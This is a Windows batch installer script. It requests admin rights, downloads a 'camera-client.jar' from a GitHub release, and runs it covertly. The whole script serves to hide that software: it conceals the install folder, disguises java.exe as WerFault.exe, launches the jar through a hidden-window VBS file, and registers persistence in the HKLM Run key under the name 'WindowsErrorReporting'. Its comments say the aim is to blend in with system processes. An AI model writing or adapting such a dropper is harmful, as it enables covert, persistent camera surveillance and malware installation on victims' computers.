@echo off
:: Request admin rights if not already elevated
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set INSTALL_DIR=C:\ProgramData\CameraService
set JAR_URL=https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar
set JAR_PATH=%INSTALL_DIR%\camera-client.jar
set VBS_PATH=%INSTALL_DIR%\launch.vbs

:: Find java.exe
set JAVA_EXE=
for /f "tokens=*" %%i in ('where java 2^>nul') do set JAVA_EXE=%%i
if not defined JAVA_EXE (
    for /d %%d in ("C:\Program Files\Java\*") do set JAVA_EXE=%%d\bin\java.exe
)
if not defined JAVA_EXE (
    for /d %%d in ("C:\Program Files\Microsoft\jdk-*") do set JAVA_EXE=%%d\bin\java.exe
)
if not defined JAVA_EXE (
    for /d %%d in ("C:\Program Files\Eclipse Adoptium\*") do set JAVA_EXE=%%d\bin\java.exe
)

:: Install Java if not found
if not defined JAVA_EXE (
    echo Java not found. Downloading JDK...
    curl.exe -L -o "%TEMP%\jdk.exe" "https://download.oracle.com/java/21/latest/jdk-21_windows-x64_bin.exe"
    echo Installing Java...
    "%TEMP%\jdk.exe" /s
    del "%TEMP%\jdk.exe"
    for /d %%d in ("C:\Program Files\Java\*") do set JAVA_EXE=%%d\bin\java.exe
)

if not defined JAVA_EXE (
    echo [!] Java not found. Install from https://java.com and retry.
    pause
    exit /b 1
)

echo [*] Java: %JAVA_EXE%

:: Create install folder
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib +H +S "%INSTALL_DIR%"

:: Copy java.exe as WerFault.exe (Windows Error Reporting — blends in with system processes)
set JAVA_DIR=%JAVA_EXE:\bin\java.exe=%
set CAM_EXE=%INSTALL_DIR%\WerFault.exe
if not exist "%CAM_EXE%" (
    copy /Y "%JAVA_EXE%" "%CAM_EXE%" >nul
    :: Copy the JVM dll that java.exe needs to find at runtime
    if exist "%JAVA_DIR%\bin\server\jvm.dll" (
        if not exist "%INSTALL_DIR%\server" mkdir "%INSTALL_DIR%\server"
        copy /Y "%JAVA_DIR%\bin\server\jvm.dll" "%INSTALL_DIR%\server\jvm.dll" >nul
    )
)

:: Download jar if not present
if not exist "%JAR_PATH%" (
    echo Downloading camera client...
    setlocal enabledelayedexpansion
    for /f "delims=" %%v in ('curl.exe -sL "https://github.com/reyHay/reyhancam/releases/latest/download/version.txt" 2^>nul') do set CAM_VERSION=%%v
    if defined CAM_VERSION (
        echo Downloading version: !CAM_VERSION!
    ) else (
        echo Downloading latest version...
    )
    curl.exe -L -o "%JAR_PATH%" "%JAR_URL%"
    if defined CAM_VERSION echo !CAM_VERSION!> "%INSTALL_DIR%\version.txt"
    endlocal
    echo Download complete.
)

:: Write VBS using the renamed exe — Task Manager will show "CameraService.exe"
powershell -Command "$j='%CAM_EXE%'; $p='%JAR_PATH%'; $v='%VBS_PATH%'; Set-Content $v \"Set WshShell = CreateObject(`\"WScript.Shell`\")`r`nWshShell.Run `\"`\"`\"$j`\"`\" --enable-native-access=ALL-UNNAMED -jar `\"`\"$p`\"`\"`\", 0, False\""

:: Register in startup (disguised as Windows Error Reporting)
powershell -Command "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' /v WindowsErrorReporting /t REG_SZ /d ('wscript.exe ' + '\"' + '%VBS_PATH%' + '\"') /f"

:: Launch
start "" wscript.exe "%VBS_PATH%"
echo [+] Done. Process will appear as WerFault.exe in Task Manager.
exit /b
